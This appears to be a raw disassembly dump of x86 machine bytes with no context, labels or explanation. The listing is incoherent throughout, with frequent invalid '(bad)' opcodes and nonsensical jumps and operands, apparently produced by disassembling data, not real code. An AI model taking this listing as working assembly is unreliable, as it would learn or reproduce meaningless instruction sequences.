  416ddc:	mov    edi,DWORD PTR [ebx-0x2d]
  416ddf:	(bad)  
  416de0:	jle    0x416e58
  416de2:	sub    edi,DWORD PTR [ecx+0x6f]
  416de5:	outs   dx,BYTE PTR ds:[esi]
  416de6:	imul   ebp,DWORD PTR [edi+0x6106b094],0x8
  416ded:	inc    cl
  416def:	add    BYTE PTR [eax-0x17],al
  416df2:	push   esi
  416df3:	(bad)  
  416df4:	sbb    eax,esi
  416df6:	cmp    al,BYTE PTR [edi-0x1d]
  416df9:	jno    0x416db8
  416dfb:	jmp    0x416e76
  416dfd:	jecxz  0x416d8b
  416dff:	cmp    eax,DWORD PTR [esi+0x54]
  416e02:	ja     0x416e4c
  416e04:	sub    bl,BYTE PTR [esi]
  416e06:	sub    eax,0xccbaa15d
  416e0b:	cmp    bh,al
  416e0d:	jne    0x416da8
  416e0f:	adc    al,0x7
  416e11:	sbb    al,0x54
  416e13:	push   es
  416e14:	ss cld 
  416e16:	mov    eax,ds:0xc0e27823
  416e1b:	mov    al,ds:0x274ac6d6
  416e20:	ins    BYTE PTR es:[edi],dx
  416e21:	fmul   DWORD PTR [ebx-0x42f118f4]
  416e27:	rcr    bh,0x84
  416e2a:	call   0xe1a4:0x6c847e7
  416e31:	jne    0x416e66
  416e33:	add    BYTE PTR [ebx+0x1e2ee826],0xbe
  416e3a:	mov    ebx,0xc4d9db2f
  416e3f:	test   DWORD PTR [eax+0x44],0x1563b2d
  416e46:	test   DWORD PTR [ebx-0x86d7f1a],0x22bddff9
  416e50:	jbe    0x416e0d
  416e52:	push   edi
  416e53:	adc    al,0x7b
  416e55:	mov    bh,0xec
  416e57:	mov    eax,ds:0xd6e2e233
  416e5c:	mov    ?,WORD PTR ds:0x6491f1a2
  416e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e63:	add    eax,0x693e4a3a
  416e68:	mov    ebx,DWORD PTR [edi-0x17d35dae]
  416e6e:	repz sbb ecx,esp
  416e71:	cmp    edi,DWORD PTR [ebx+0x30e9bcd2]
  416e77:	inc    edi
  416e78:	or     BYTE PTR [edi+ecx*8+0x57],al
  416e7c:	(bad)  
  416e7d:	xchg   esp,eax
  416e7e:	iret   
  416e7f:	jmp    0xa885bd2e
  416e84:	lock dec esp
  416e86:	scas   eax,DWORD PTR es:[edi]
  416e87:	lock stos BYTE PTR es:[edi],al
  416e89:	pop    ss
  416e8a:	xchg   ebp,eax
  416e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e8c:	inc    ebx
  416e8d:	cdq    
  416e8e:	mov    ch,0x3a
  416e90:	and    BYTE PTR [ebp-0x3bf10ade],bh
  416e96:	pop    edi
  416e97:	cmp    BYTE PTR [edi],dh
  416e99:	and    esi,DWORD PTR [edx-0x17c2f73e]
  416e9f:	mov    esp,0x753efa91
  416ea4:	nop
  416ea5:	ret    0x13ec
  416ea8:	mov    esp,0xc6df0767
  416ead:	fnop   
  416eaf:	cs das 
  416eb1:	ret    0xc27c
  416eb4:	adc    eax,0xd99fe0f2
  416eb9:	pop    esi
  416eba:	dec    esp
  416ebb:	sub    dh,ch
  416ebd:	add    al,0x6e
  416ebf:	fild   DWORD PTR [eax-0x3a]
  416ec2:	les    eax,FWORD PTR [ebx+esi*4]
  416ec5:	es loope 0x416ef6
  416ec8:	mov    DWORD PTR [eax+ebx*2],ebp
  416ecb:	or     eax,0x5ebd7faa
  416ed0:	fld    DWORD PTR [ebx]
  416ed2:	sub    al,0xa
  416ed4:	pop    ss
  416ed5:	push   ds
  416ed6:	mov    edi,0x5cb4f70f
  416edb:	rcr    BYTE PTR [ecx+0x6f830da],1
  416ee1:	cmp    BYTE PTR [ebp+0xe],ah
  416ee4:	mov    ah,0xb0
  416ee6:	inc    ecx
  416ee7:	pop    edx
  416ee8:	xor    eax,0x355a6b51
  416eed:	xor    eax,0x4234bb7b
  416ef2:	or     cl,bh
  416ef4:	(bad)  
  416ef5:	xor    eax,0x77a76121
  416efa:	jmp    0x823d:0x410e362a
  416f01:	pop    ds
  416f02:	cwde   
  416f03:	cmp    BYTE PTR cs:[edx+0x15],dl
  416f07:	fsubr  st,st(6)
  416f09:	adc    BYTE PTR [edi+0x3a],dh
  416f0c:	das    
  416f0d:	xchg   DWORD PTR [ebp+0x38f8c390],edi
  416f13:	lea    esi,ds:0x24471191
  416f19:	inc    ebx
  416f1a:	mov    ebp,0xbc51763
  416f1f:	enter  0x3c02,0x88
  416f23:	mov    eax,0x9f79bec2
  416f28:	pop    eax
  416f29:	jp     0x416ee0
  416f2b:	cmp    BYTE PTR [edi],dh
  416f2d:	adc    eax,0xfbf4b194
  416f32:	daa    
  416f33:	loope  0x416f60
  416f35:	mov    ebp,0xeada3cf0
  416f3a:	and    esi,0x794147a0
  416f40:	in     al,0x13
  416f42:	mov    bh,0x61
  416f44:	push   es
  416f45:	push   edx
  416f46:	gs mov al,0xa0
  416f49:	dec    eax
  416f4a:	dec    DWORD PTR [edx]
  416f4c:	or     esi,DWORD PTR [edx-0x6e5e1dd8]
  416f52:	ds push es
  416f54:	cmp    esi,ebx
  416f56:	scas   al,BYTE PTR es:[edi]
  416f57:	mov    eax,0x897b9ccf
  416f5c:	es je  0x416f86
  416f5f:	mov    bl,0xed
  416f61:	adc    ebp,DWORD PTR [ecx]
  416f63:	dec    ebx
  416f64:	pushf  
  416f65:	scas   al,BYTE PTR es:[edi]
  416f66:	adc    eax,0xcd7276ce
  416f6b:	adc    eax,0x3b6dff1a
  416f70:	(bad)  
  416f71:	mov    esp,0xc4cdb9a5
  416f76:	jno    0x416feb
  416f78:	pushf  
  416f79:	lahf   
  416f7a:	add    DWORD PTR [ebx-0x40],eax
  416f7d:	mov    edi,0x91a7411c
  416f82:	imul   DWORD PTR [esi+0x745507d2]
  416f88:	or     bl,dh
  416f8a:	sbb    al,0x78
  416f8c:	les    edx,FWORD PTR [ebx+eiz*1-0x7]
  416f90:	fsubr  DWORD PTR [ebp-0x580e2daa]
  416f96:	and    ah,BYTE PTR [ebx+ecx*8]
  416f99:	xor    BYTE PTR [esi-0x32],dl
  416f9c:	into   
  416f9d:	add    BYTE PTR [ebx-0x6a7d912e],ch
  416fa3:	push   esp
  416fa4:	jae    0x416f91
  416fa6:	mov    ebx,0x35c3871c
  416fab:	mov    DWORD PTR [ecx],esp
  416fad:	aad    0x86
  416faf:	sbb    DWORD PTR [ecx],edx
  416fb1:	jmp    0x416fc7
  416fb3:	adc    DWORD PTR [ebx+0x2dffa79c],ecx
  416fb9:	add    edx,0xffffffe7
  416fbc:	data16 and al,0x4c
  416fbf:	and    eax,0xd4c658ea
  416fc4:	(bad)  
  416fc5:	jns    0x416f71
  416fc7:	dec    BYTE PTR [ebp-0xeaad617]
  416fcd:	sbb    BYTE PTR [ecx-0x2b],ah
  416fd0:	or     eax,0x1bad1a32
  416fd5:	or     esi,edx
  416fd7:	jecxz  0x417002
  416fd9:	and    BYTE PTR [eiz*8+0x5ec9e67],dl
  416fe0:	dec    esi
  416fe1:	push   cs
  416fe2:	mov    edx,0xfdf42f3b
  416fe7:	xchg   BYTE PTR [ebx],ah
  416fe9:	js     0x41701f
  416feb:	dec    eax
  416fec:	xchg   edi,eax
  416fed:	and    dh,BYTE PTR [eax-0x2d]
  416ff0:	rcr    BYTE PTR [edi],1
  416ff2:	dec    ebx
  416ff3:	jmp    0x417001
  416ff5:	nop
  416ff6:	jmp    0x416f88
  416ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff9:	cdq    
  416ffa:	cmp    eax,0xb43e646e
  416fff:	pop    esp
  417000:	cmp    dh,BYTE PTR [ecx+0x52]
  417003:	cmc    
  417004:	sbb    al,0xa2
  417006:	dec    ebx
  417007:	push   edi
  417008:	xchg   ebp,eax
  417009:	or     eax,0x7253d962
  41700e:	(bad)  
  41700f:	(bad)  
  417010:	jmp    0x416fcc
  417012:	mov    edi,0x2babb5b3
  417017:	mov    ds:0xf9f3c07a,al
  41701c:	cmp    eax,0x8d252bd3
  417021:	jg     0x417066
  417023:	cmp    DWORD PTR [edi+0x36e4ebe6],edi
  417029:	retf   0x516c
  41702c:	pop    eax
  41702d:	adc    dl,0xae
  417030:	and    DWORD PTR [ecx+0x7c3951b4],ecx
  417036:	pushf  
  417037:	sbb    DWORD PTR [esi-0x70],0x72f9fc7e
  41703e:	test   eax,0x573c5bfa
  417043:	xchg   DWORD PTR [ebx],ebp
  417045:	sbb    ch,BYTE PTR [esi]
  417047:	add    ebx,edx
  417049:	mov    edi,0x39fdfcd
  41704e:	dec    ecx
  41704f:	ss cdq 
  417051:	or     esi,DWORD PTR [ebx-0x69]
  417054:	xchg   edx,eax
  417055:	je     0x416ff0
  417057:	hlt    
  417058:	sub    BYTE PTR [ecx+0x7f],bl
  41705b:	(bad)  
  41705c:	into   
  41705d:	in     eax,0x7d
  41705f:	mov    BYTE PTR [ecx],bh
  417061:	das    
  417062:	test   DWORD PTR [eax],ebx
  417064:	jmp    0x4170d5
  417066:	sbb    dh,ah
  417068:	scas   eax,DWORD PTR es:[edi]
  417069:	xor    al,0x77
  41706b:	stos   BYTE PTR es:[edi],al
  41706c:	jge    0x4170d9
  41706e:	adc    dh,BYTE PTR [ebp-0x54]
  417071:	(bad)  
  417072:	mov    eax,esp
  417074:	(bad)  
  417075:	pop    edi
  417076:	fmul   QWORD PTR [edx-0x3f]
  417079:	pop    esp
  41707a:	(bad)  
  41707b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41707c:	adc    DWORD PTR ds:0xe5b719ea,ebp
  417082:	dec    esp
  417083:	add    BYTE PTR [esi],ch
  417085:	and    DWORD PTR [ecx],ebx
  417087:	das    
  417088:	add    DWORD PTR [edi],0xffffffa4
  41708b:	dec    edx
  41708c:	mov    ds:0x5aee98f,eax
  417091:	pop    esp
  417092:	xor    DWORD PTR [esi-0x28],ecx
  417095:	jns    0x4170c2
  417097:	mov    ch,dh
  417099:	add    BYTE PTR [ebx-0x28],0x59
  41709d:	ja     0x41709d
  41709f:	adc    BYTE PTR [ebx],dl
  4170a1:	outs   dx,DWORD PTR ds:[esi]
  4170a2:	inc    esi
  4170a3:	mov    dl,BYTE PTR [edx*2+0x54717dc]
  4170aa:	mov    eax,0x592b7aa3
  4170af:	sub    BYTE PTR [ecx+ecx*4-0x359eb2d0],0x91
  4170b7:	bnd jb 0x417069
  4170ba:	xchg   ebp,eax
  4170bb:	cwde   
  4170bc:	dec    ecx
  4170bd:	fucomip st,st(1)
  4170bf:	ffree  st(6)
  4170c1:	add    DWORD PTR [esi],ecx
  4170c3:	sub    DWORD PTR [edx],0xffffffc7
  4170c6:	ficom  DWORD PTR [ebx-0x6fca1c09]
  4170cc:	lods   eax,DWORD PTR ds:[esi]
  4170cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ce:	hlt    
  4170cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d0:	std    
  4170d1:	and    al,0x3f
  4170d3:	sbb    BYTE PTR [edi+0x215f2b03],0xcc
  4170da:	jp     0x4170d8
  4170dc:	pop    es
  4170dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170de:	ret    
  4170df:	das    
  4170e0:	pop    ds
  4170e1:	cmp    bh,BYTE PTR [eax]
  4170e3:	leave  
  4170e4:	jg     0x417122
  4170e6:	dec    esp
  4170e7:	loopne 0x4170cf
  4170e9:	and    esp,DWORD PTR [edx+0x3bab5929]
  4170ef:	inc    eax
  4170f0:	xchg   edx,eax
  4170f1:	adc    bh,BYTE PTR [esi]
  4170f3:	add    ecx,ebx
  4170f5:	adc    esi,eax
  4170f7:	mov    edx,0x8cbe8efc
  4170fc:	or     al,0x96
  4170fe:	jb     0x41714a
  417100:	xchg   esi,eax
  417101:	xlat   BYTE PTR ds:[ebx]
  417102:	xchg   ebp,eax
  417103:	cwde   
  417104:	cmc    
  417105:	xchg   ebp,eax
  417106:	adc    DWORD PTR [esi+0x6cd33d72],esp
  41710c:	xor    eax,0x24c16800
  417111:	cld    
  417112:	push   cs
  417113:	std    
  417114:	xchg   BYTE PTR [esi-0x11],ah
  417117:	ds pop ss
  417119:	inc    esp
  41711a:	icebp  
  41711b:	rcl    DWORD PTR [ebp-0x5e],cl
  41711e:	fiadd  WORD PTR [edx+0x24641982]
  417124:	jne    0x41710a
  417126:	mov    dl,BYTE PTR [esi]
  417128:	sub    al,0xdc
  41712a:	(bad)  
  41712c:	jae    0x4170fb
  41712e:	cmp    eax,0xc2895875
  417133:	dec    eax
  417134:	sub    BYTE PTR [eax],ah
  417136:	je     0x41715e
  417138:	jb     0x4170e8
  41713a:	(bad)  
  41713b:	aaa    
  41713c:	mov    ds:0xc2d788c8,eax
  417141:	enter  0x8a6a,0x81
  417145:	(bad)  
  417146:	lds    ebx,FWORD PTR [edi-0x60e32e35]
  41714c:	adc    ebp,eax
  41714e:	mov    al,0x19
  417150:	ins    DWORD PTR es:[edi],dx
  417151:	jb     0x41711a
  417153:	mov    BYTE PTR ds:0x1d2afe6c,bh
  417159:	out    0xd4,eax
  41715b:	sbb    eax,0xedda1f09
  417160:	inc    esi
  417161:	xchg   BYTE PTR [ecx],bl
  417163:	adc    eax,0x6d6f89b9
  417168:	jl     0x417134
  41716a:	jg     0x417191
  41716c:	std    
  41716d:	adc    ch,cl
  41716f:	test   dl,dh
  417171:	inc    esp
  417172:	icebp  
  417173:	gs jg  0x4171bf
  417176:	fisub  DWORD PTR gs:[edx-0x7ac93b81]
  41717d:	pop    esp
  41717e:	mov    ebp,0x6b1cdf04
  417183:	into   
  417184:	(bad)  
  417185:	out    dx,eax
  417186:	fst    QWORD PTR [edi-0x8945ff]
  41718c:	xchg   ebp,eax
  41718d:	inc    edx
  41718e:	and    esi,DWORD PTR [esi+0x389b6f08]
  417194:	bound  ebp,QWORD PTR [ebp+0x73]
  417197:	jl     0x4171e8
  417199:	and    BYTE PTR [eax],bl
  41719b:	ins    BYTE PTR es:[edi],dx
  41719c:	jl     0x417215
  41719e:	pop    ds
  41719f:	push   ss
  4171a0:	add    DWORD PTR [esi+ecx*4+0x7630a786],edi
  4171a7:	and    BYTE PTR [ebx+eiz*4-0x1],ch
  4171ab:	jg     0x4171a3
  4171ad:	dec    DWORD PTR [edi]
  4171af:	popf   
  4171b0:	pop    esi
  4171b1:	addr16 out dx,al
  4171b3:	or     BYTE PTR [ebx+0x34679f9a],bh
  4171b9:	push   0xc681ea90
  4171be:	dec    edx
  4171bf:	loop   0x41722d
  4171c1:	gs ss jmp 0x41719f
  4171c5:	inc    esp
  4171c6:	lea    ebp,[eax]
  4171c8:	ficom  WORD PTR [edi+0x2d4f8215]
  4171ce:	fcmovnu st,st(5)
  4171d0:	iret   
  4171d1:	jp     0x417233
  4171d3:	out    dx,al
  4171d4:	jno    0x4171e2
  4171d6:	enter  0x1a23,0x9d
  4171da:	sub    al,0x76
  4171dc:	xor    bl,ch
  4171de:	jno    0x41724f
  4171e0:	into   
  4171e1:	dec    ebp
  4171e2:	pushf  
  4171e3:	fiadd  DWORD PTR [ebx]
  4171e5:	push   cs
  4171e6:	aaa    
  4171e7:	inc    edi
  4171e8:	test   eax,0xe66cfdfc
  4171ed:	jg     0x417208
  4171ef:	push   esi
  4171f0:	adc    eax,0x1f0840f1
  4171f5:	mov    ch,0x21
  4171f7:	repnz ins DWORD PTR es:[edi],dx
  4171f9:	mov    esp,0xd928329b
  4171fe:	pop    ebx
  4171ff:	(bad)  
  417200:	xor    DWORD PTR [eax],esp
  417202:	mov    dl,0x63
  417204:	outs   dx,DWORD PTR ds:[esi]
  417205:	mov    DWORD PTR [eax-0x325caf77],esi
  41720b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720c:	push   ds
  41720d:	jo     0x4171f4
  41720f:	jns    0x4171e5
  417211:	pop    esi
  417212:	out    dx,al
  417213:	cld    
  417214:	mov    al,0x5b
  417216:	xchg   ebp,eax
  417217:	rcl    DWORD PTR [eax+0x6b0a7c53],1
  41721d:	nop
  41721e:	test   al,0xda
  417220:	test   DWORD PTR [eax+0x12],edx
  417223:	adc    dh,BYTE PTR [edx-0x2a98a9c]
  417229:	mov    WORD PTR [edi+0x9ee8eb3],?
  41722f:	xor    BYTE PTR [ecx],bl
  417231:	add    DWORD PTR [edx],ecx
  417233:	pop    ecx
  417234:	mov    BYTE PTR [ebx+0x3e3dccb9],ah
  41723a:	inc    esp
  41723b:	push   ecx
  41723c:	pop    ecx
  41723d:	scas   eax,DWORD PTR es:[edi]
  41723e:	int3   
  41723f:	and    al,0x6a
  417241:	jnp    0x417202
  417243:	mov    cs:0xe627e99e,al
  417249:	sub    dl,BYTE PTR [edx+0x24a14fe9]
  41724f:	cld    
  417250:	adc    ebx,ebp
  417252:	(bad)  
  417253:	outs   dx,BYTE PTR ds:[esi]
  417254:	int    0xb7
  417256:	dec    eax
  417257:	ds jae 0x41721e
  41725a:	mov    BYTE PTR [esi],ch
  41725c:	js     0x4171e8
  41725e:	push   ebx
  41725f:	jb     0x41722b
  417261:	jl     0x4172da
  417263:	sbb    al,0x65
  417265:	dec    esp
  417266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417267:	sbb    eax,0xf657e9c0
  41726c:	mov    ebx,0x3e5d4437
  417271:	lods   al,BYTE PTR ds:[esi]
  417272:	mov    eax,ds:0x2e5a86d
  417277:	fs scas eax,DWORD PTR es:[edi]
  417279:	sub    al,0xd1
  41727b:	call   0xaf06:0xbdcd47d5
  417282:	gs in  eax,0xbd
  417285:	cwde   
  417286:	retf   
  417287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417288:	jo     0x417216
  41728a:	mov    BYTE PTR [ebp-0x34a9bcc4],bl
  417290:	into   
  417291:	ds call 0xa7cc8fc4
  417297:	aas    
  417298:	mov    ah,0x6f
  41729a:	aam    0x22
  41729c:	jno    0x4172ce
  41729e:	adc    bh,BYTE PTR [ebx+edi*2]
  4172a1:	mov    ecx,0x2af9eb1d
  4172a6:	fistp  WORD PTR [esi]
  4172a8:	push   es
  4172a9:	fs xchg ebp,eax
  4172ab:	inc    ebx
  4172ac:	sub    eax,0xb1d25406
  4172b1:	jnp    0x41728d
  4172b3:	les    eax,FWORD PTR [esi]
  4172b5:	mov    bh,0x4e
  4172b7:	sbb    DWORD PTR ds:0x66f22893,ebp
  4172bd:	stos   BYTE PTR es:[edi],al
  4172be:	cmp    eax,0xc605c3d5
  4172c3:	xchg   ebx,eax
  4172c4:	leave  
  4172c5:	pop    edi
  4172c6:	mov    dl,0xee
  4172c8:	ins    BYTE PTR es:[edi],dx
  4172c9:	bound  edi,QWORD PTR [ebx+ebp*4+0x3e061751]
  4172d0:	nop
  4172d1:	rcr    DWORD PTR [eax],1
  4172d3:	cmp    eax,0x82a31dc0
  4172d9:	pop    edi
  4172da:	adc    eax,0x3de58df3
  4172df:	pop    esp
  4172e0:	std    
  4172e1:	jmp    0x41734c
  4172e3:	call   DWORD PTR ds:0x84d19e83
  4172e9:	pop    esi
  4172ea:	jle    0x4172f6
  4172ec:	jle    0x41729d
  4172ee:	cld    
  4172ef:	fsub   DWORD PTR [ebp+0x2cf0f389]
  4172f5:	cmp    DWORD PTR gs:[eax-0x3e],ecx
  4172f9:	or     DWORD PTR [ecx+0x52],0xffffffe7
  4172fd:	int    0xfa
  4172ff:	arpl   WORD PTR [edi+0x6a9335fc],dx
  417305:	or     al,0x6
  417307:	mov    eax,DWORD PTR [ebp+0x3a5baa5a]
  41730d:	adc    BYTE PTR [esi],dl
  41730f:	retf   0xb11
  417312:	jge    0x417364
  417314:	dec    ebx
  417315:	mov    ecx,0xa1cf0cee
  41731a:	inc    esi
  41731b:	stos   DWORD PTR es:[edi],eax
  41731c:	mov    bl,0xe9
  41731e:	jmp    0x75d6:0xa4471e53
  417325:	push   edx
  417326:	ins    DWORD PTR es:[edi],dx
  417327:	inc    ecx
  417328:	(bad)  
  417329:	cmp    BYTE PTR [ecx+ebp*1],dl
  41732c:	dec    edi
  41732d:	mov    ?,edi
  41732f:	mov    esi,0x74f12ffe
  417334:	jb     0x41731c
  417336:	in     eax,dx
  417337:	sbb    cl,BYTE PTR [ebx]
  417339:	retf   0xa269
  41733c:	shr    edi,cl
  41733e:	retf   
  41733f:	add    al,0xa
  417341:	(bad)  
  417342:	in     eax,dx
  417343:	xchg   esp,eax
  417344:	hlt    
  417345:	enter  0x45,0x5d
  417349:	or     bh,BYTE PTR [esi+0x27]
  41734c:	repnz adc DWORD PTR [ecx+ebx*2+0x30ea3edf],0xa
  417355:	repnz (bad) 
  417357:	popf   
  417358:	jle    0x4173a3
  41735a:	pop    ebp
  41735b:	or     ebp,eax
  41735d:	add    BYTE PTR [eax+0x44],bl
  417360:	dec    ecx
  417361:	rol    BYTE PTR [ecx-0x7c],1
  417364:	arpl   si,dx
  417366:	shl    BYTE PTR [ecx],1
  417368:	ins    DWORD PTR es:[edi],dx
  417369:	sub    al,bl
  41736b:	xor    bh,bh
  41736d:	sar    DWORD PTR [ebp+ebp*2-0x6d],1
  417371:	mov    bh,0xc0
  417373:	inc    ebx
  417374:	arpl   WORD PTR [ebx+eiz*1],cx
  417377:	cli    
  417378:	(bad)  
  417379:	xchg   edi,eax
  41737a:	repz jmp 0x41739f
  41737d:	mov    dh,0x43
  41737f:	aam    0xca
  417381:	js     0x41733f
  417383:	out    0x54,eax
  417385:	add    DWORD PTR [ecx+ebp*8-0x4486156d],0x73
  41738d:	pop    esp
  41738e:	(bad)  [eax]
  417390:	jno    0x41735d
  417392:	xchg   edi,eax
  417393:	pushf  
  417394:	dec    ebp
  417395:	xchg   ebx,eax
  417396:	clc    
  417397:	xor    esi,eax
  417399:	icebp  
  41739a:	mov    cl,0x36
  41739c:	sar    edi,0xb4
  41739f:	or     edi,DWORD PTR [edi]
  4173a1:	xor    BYTE PTR [ecx],0x31
  4173a4:	cli    
  4173a5:	leave  
  4173a6:	ins    BYTE PTR es:[edi],dx
  4173a7:	or     cl,BYTE PTR [eax]
  4173a9:	lds    edi,FWORD PTR [eax]
  4173ab:	popf   
  4173ac:	mov    esp,esp
  4173ae:	imul   edi,DWORD PTR [ebx],0x74d32e28
  4173b4:	xchg   ebp,eax
  4173b5:	add    esp,DWORD PTR [esp+ecx*8]
  4173b8:	sub    al,cl
  4173ba:	xchg   esi,eax
  4173bb:	and    BYTE PTR [edx+0xd1f29a1],ch
  4173c1:	repnz inc ecx
  4173c3:	mov    WORD PTR [ecx+0x1bdad99b],ss
  4173c9:	push   eax
  4173ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173cb:	mov    esp,DWORD PTR [edi+edx*2+0x7fd594c2]
  4173d2:	mov    cl,0x9d
  4173d4:	xchg   BYTE PTR [esi],ch
  4173d6:	xlat   BYTE PTR ds:[ebx]
  4173d7:	daa    
  4173d8:	sbb    DWORD PTR [edi-0x70],edx
  4173db:	mov    ah,0x28
  4173dd:	outs   dx,DWORD PTR ds:[esi]
  4173de:	mov    al,0xea
  4173e0:	retf   
  4173e1:	cmp    al,0x52
  4173e3:	mov    esi,0x38bcd302
  4173e8:	mov    edx,0x79811cd0
  4173ed:	pop    ecx
  4173ee:	or     bh,bl
  4173f0:	xlat   BYTE PTR ds:[ebx]
  4173f1:	pop    ebx
  4173f2:	mov    edi,0x61dff23e
  4173f7:	sti    
  4173f8:	in     al,dx
  4173f9:	dec    esp
  4173fa:	retf   
  4173fb:	(bad)  
  4173fd:	imul   ebp,DWORD PTR [ebp+0x118d9e2],0x44b8497c
  417407:	ins    BYTE PTR es:[edi],dx
  417408:	add    al,0x70
  41740a:	leave  
  41740b:	stc    
  41740c:	aaa    
  41740d:	fiadd  DWORD PTR [esi]
  41740f:	xchg   BYTE PTR [edi+0x369989ce],dl
  417415:	adc    ebp,DWORD PTR [esi]
  417417:	imul   ebp,DWORD PTR [ecx+0x51be246f],0x8ccdf8dd
  417421:	adc    al,0xf2
  417423:	jecxz  0x417445
  417425:	aad    0xfc
  417427:	pop    ebx
  417428:	jb     0x4173f7
  41742a:	mov    ds:0xd5a801c8,al
  41742f:	inc    edx
  417430:	cmp    al,ch
  417432:	pop    edx
  417433:	jmp    0x6cbe:0x7ccb5baa
  41743a:	outs   dx,BYTE PTR ds:[esi]
  41743b:	pop    ebx
  41743c:	scas   al,BYTE PTR es:[edi]
  41743d:	push   cs
  41743e:	clc    
  41743f:	sbb    eax,0x11899f72
  417444:	jmp    0x88eacd75
  417449:	lods   eax,DWORD PTR ds:[esi]
  41744a:	pop    ecx
  41744b:	into   
  41744c:	inc    ebp
  41744d:	fxam   
  41744f:	jb     0x41746d
  417451:	stc    
  417452:	push   edi
  417453:	mov    esp,0x825344a5
  417458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417459:	inc    esp
  41745a:	push   eax
  41745b:	mov    ebp,0xcadd2a56
  417460:	test   DWORD PTR [ebx+0x3e339e56],ecx
  417466:	xchg   edi,eax
  417467:	cmp    edi,DWORD PTR [edi-0x3583e097]
  41746d:	dec    esi
  41746e:	mov    cl,0xea
  417470:	hlt    
  417471:	into   
  417472:	(bad)
  417475:	daa    
  417476:	xchg   edx,eax
  417477:	out    dx,al
  417478:	mov    WORD PTR [ebx],?
  41747a:	mov    edx,0x54cc41a6
  41747f:	xlat   BYTE PTR ds:[ebx]
  417480:	push   edx
  417481:	enter  0x2890,0x59
  417485:	push   ss
  417486:	fisub  WORD PTR [edi]
  417488:	(bad)  
  417489:	out    0xc4,eax
  41748b:	repz ds push ds
  41748e:	sub    bh,BYTE PTR [eax+edx*4-0x6e5a4c8a]
  417495:	sub    BYTE PTR [edx],ah
  417497:	icebp  
  417498:	pop    ebp
  417499:	cmp    al,0xc6
  41749b:	shl    DWORD PTR [eax-0x2a874251],1
  4174a1:	xor    BYTE PTR [ebx+0x7c],bh
  4174a4:	je     0x4174f4
  4174a6:	mov    eax,0x4759589
  4174ab:	shr    BYTE PTR [ecx-0x1a],cl
  4174ae:	xor    BYTE PTR [eax+edi*1],dh
  4174b1:	imul   DWORD PTR [ebx+eiz*1]
  4174b4:	ins    BYTE PTR es:[edi],dx
  4174b5:	aam    0xb6
  4174b7:	sub    ecx,0x4db18faa
  4174bd:	ret    
  4174be:	pop    edx
  4174bf:	ror    BYTE PTR [edx-0x7e36ffdd],cl
  4174c5:	mov    edx,0x3bd768f1
  4174cb:	fist   WORD PTR [edx]
  4174cd:	btc    edx,edx
  4174d0:	das    
  4174d1:	sub    ebp,edi
  4174d3:	les    esp,FWORD PTR [esi-0x79]
  4174d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174d7:	jns    0x41752e
  4174d9:	and    eax,0xbb8e8f07
  4174de:	loop   0x417544
  4174e0:	(bad)  
  4174e1:	push   edi
  4174e2:	inc    edx
  4174e3:	sahf   
  4174e4:	fisubr WORD PTR [esi]
  4174e6:	cwde   
  4174e7:	sbb    al,0xd2
  4174e9:	mov    bh,0xa0
  4174eb:	add    edx,DWORD PTR [edi-0x12]
  4174ee:	sbb    DWORD PTR ds:[ebx-0x60dbac2a],esp
  4174f5:	xchg   esi,eax
  4174f6:	gs add eax,0x682dbce5
  4174fc:	pop    edi
  4174fd:	cmp    al,0xbe
  4174ff:	xor    eax,0x4aac521b
  417504:	test   al,0x98
  417506:	dec    edi
  417507:	adc    eax,0x304babfe
  41750c:	loop   0x41749d
  41750e:	loopne 0x4174bd
  417510:	repz shr DWORD PTR [edi+0x783dbbb3],cl
  417517:	jo     0x417519
  417519:	retf   0x492e
  41751c:	cld    
  41751d:	outs   dx,BYTE PTR ds:[esi]
  41751e:	dec    di
  417520:	add    DWORD PTR [edi-0x319a3826],0xffffff8b
  417527:	std    
  417528:	cmp    ecx,DWORD PTR [edx+0x3d]
  41752b:	mov    bl,0xb7
  41752d:	test   eax,0x3fac9782
  417532:	add    BYTE PTR [ebx],al
  417534:	add    DWORD PTR [edi-0x59d537e5],0xfa253583
  41753e:	push   ds
  41753f:	push   ebp
  417540:	dec    ecx
  417541:	in     eax,dx
  417542:	sbb    eax,0x77692fae
  417547:	pop    ecx
  417548:	sbb    eax,0xbe0515ec
  41754d:	and    al,0x46
  41754f:	callw  0x1346
  417553:	pop    edx
  417554:	inc    edi
  417555:	sub    edx,DWORD PTR [esi-0x14a1ad39]
  41755b:	test   DWORD PTR [esi-0x3e868d3c],esi
  417561:	in     al,0x3e
  417563:	rcr    cl,cl
  417565:	jno    0x4175c3
  417567:	or     DWORD PTR [esi+0x29],ecx
  41756a:	jg     0x41750e
  41756c:	mov    ch,0xec
  41756e:	jns    0x41755b
  417570:	std    
  417571:	(bad)  
  417572:	mov    bp,0x6e46
  417576:	cmp    DWORD PTR [ebp+0x57],0x17aaafb2
  41757d:	mov    ch,0x1e
  41757f:	xchg   DWORD PTR [ebx],ecx
  417581:	add    BYTE PTR [edx+0x2b],dl
  417584:	(bad)  
  417585:	or     al,0x73
  417587:	out    dx,eax
  417588:	mov    ds:0x3daa4212,al
  41758d:	(bad)  
  41758e:	or     edi,ecx
  417590:	jb     0x4175a1
  417592:	aas    
  417593:	je     0x4175b1
  417595:	int    0x54
  417597:	jge    0x4175f7
  417599:	push   eax
  41759a:	sub    bl,dl
  41759c:	xchg   edx,eax
  41759d:	sub    al,0x85
  41759f:	(bad)  
  4175a0:	retf   
  4175a1:	cmp    al,0x58
  4175a4:	cmp    ch,bh
  4175a6:	rol    BYTE PTR [edx],cl
  4175a8:	dec    esi
  4175a9:	mov    esp,0x30ce5c53
  4175ae:	inc    ebp
  4175af:	xchg   DWORD PTR [edi+0x31fab56e],ebp
  4175b5:	mov    edx,0xc757131f
  4175ba:	jecxz  0x4175ad
